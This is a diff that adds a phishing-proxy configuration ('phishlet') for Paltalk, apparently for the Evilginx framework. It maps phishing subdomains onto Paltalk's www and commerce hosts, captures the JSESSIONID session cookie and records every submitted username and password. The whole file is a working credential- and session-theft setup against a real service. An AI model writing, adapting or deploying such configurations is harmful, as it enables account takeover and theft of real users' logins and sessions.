@@ -1,0 +1,20 @@
+name: 'paltalk'
+author: '@UN5T48L3'
+min_ver: '2.1.0'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'paltalk.com', session: true, is_landing: true}
+  - {phish_sub: 'commerce', orig_sub: 'commerce', domain: 'paltalk.com', session: true, is_landing: false}
+sub_filters:
+  - {hostname: 'www.paltalk.com', sub: 'wwww', domain: 'paltalk.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {hostname: 'commerce.paltalk.com', sub: 'commerce', domain: 'paltalk.com', search: 'https://{hostname}/mpt/MyPalTalkHome.jsp', replace: 'https://{hostname}/mpt/MyPalTalkHome.jsp', mimes: ['text/html', 'application/json', 'application/javascript']}
+auth_tokens:
+  - domain: '.commerce.paltalk.com'
+    keys: ['JSESSIONID']
+user_regex:
+  key: 'username'
+  re: '(.*)'
+pass_regex:
+  key: 'password'
+  re: '(.*)'
+landing_path:
+  - '/mpt/MyPalTalkHome.jsp'
